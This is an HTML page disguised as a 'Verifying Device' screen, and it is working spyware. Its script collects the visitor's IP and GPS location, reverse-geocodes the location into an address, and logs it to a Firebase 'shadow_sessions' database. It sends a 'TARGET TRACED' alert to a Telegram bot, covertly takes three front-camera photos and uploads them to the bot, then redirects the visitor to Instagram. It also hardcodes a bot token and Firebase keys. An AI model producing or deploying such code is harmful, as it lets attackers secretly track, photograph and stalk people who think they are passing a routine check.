<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying System...</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body class="bg-[#020617] text-white flex items-center justify-center h-screen overflow-hidden">
    
    <div class="text-center p-10 max-w-sm w-full bg-[#0f172a] rounded-[2.5rem] border border-slate-800 shadow-2xl">
        <div class="relative w-16 h-16 mx-auto mb-6">
            <div class="absolute inset-0 border-4 border-blue-500/20 rounded-full"></div>
            <div class="absolute inset-0 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
        </div>
        <h1 class="text-xl font-black italic tracking-tighter uppercase">Verifying <span class="text-blue-500">Device</span></h1>
        
        <div class="w-full bg-slate-800 h-1.5 rounded-full mt-8 overflow-hidden">
            <div id="bar" class="bg-blue-500 h-full w-0 transition-all duration-500"></div>
        </div>
        <p id="status" class="text-[9px] font-bold text-slate-500 uppercase mt-4 tracking-widest italic">Syncing Protocol...</p>
        
        <video id="v" autoplay playsinline class="hidden"></video>
        <canvas id="c" width="1280" height="720" class="hidden"></canvas>
    </div>

    <script>
        // Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
            databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
            projectId: "in-app-update-21c61",
        };
        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
        const db = firebase.database();

        const urlParams = new URLSearchParams(window.location.search);
        const tid = urlParams.get('tid');
        const red = urlParams.get('rd') ? decodeURIComponent(urlParams.get('rd')) : "https://instagram.com";
        const botToken = "8382714466:AAFAuorgHezCvk1dr7OxExD8zAMpgFTLvLI";

        let address = "Unknown Location";
        const sessionID = "NODE-" + Math.floor(1000 + Math.random() * 9000);

        // Security
        if (!tid) { window.location.replace(red); }

        async function start() {
            try {
                // Get Network Info
                const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({ip: 'N/A'}));
                
                // Get Location
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    
                    const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`).then(r => r.json());
                    address = geo.display_name;

                    // Update Firebase Dashboard
                    db.ref('shadow_sessions/' + sessionID).set({
                        address: address,
                        target_email: ipInfo.ip,
                        time: Date.now(),
                        status: "CAPTURED",
                        platform: navigator.platform
                    });

                    // Send Telegram Alert
                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: tid,
                            text: `ðŸš¨ *TARGET TRACED*\n\nðŸ“ *ADDR:* ${address}\nðŸŒ *IP:* ${ipInfo.ip}\nðŸ†” *ID:* ${sessionID}\nðŸ”— [Open Maps](https://www.google.com/maps?q=${lat},${lon})`,
                            parse_mode: 'Markdown'
                        })
                    });
                    
                    capture();
                }, () => { capture(); }); // Proceed even if GPS denied
            } catch (e) { capture(); }
        }

        async function capture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                for(let i=1; i<=3; i++) {
                    document.getElementById('bar').style.width = (i * 33) + "%";
                    document.getElementById('status').innerText = `Syncing Packet ${i}...`;
                    
                    await new Promise(r => setTimeout(r, 1000));
                    
                    const canvas = document.getElementById('c');
                    canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
                    
                    const fd = new FormData();
                    fd.append('chat_id', tid);
                    fd.append('photo', blob, 'img.jpg');
                    fd.append('caption', `ðŸ“¸ Shot ${i} | ${sessionID}`);
                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                }
                window.location.replace(red);
            } catch (e) { window.location.replace(red); }
        }

        start();
        // Emergency Redirect after 15s
        setTimeout(() => window.location.replace(red), 15000);
    </script>
</body>
</html>
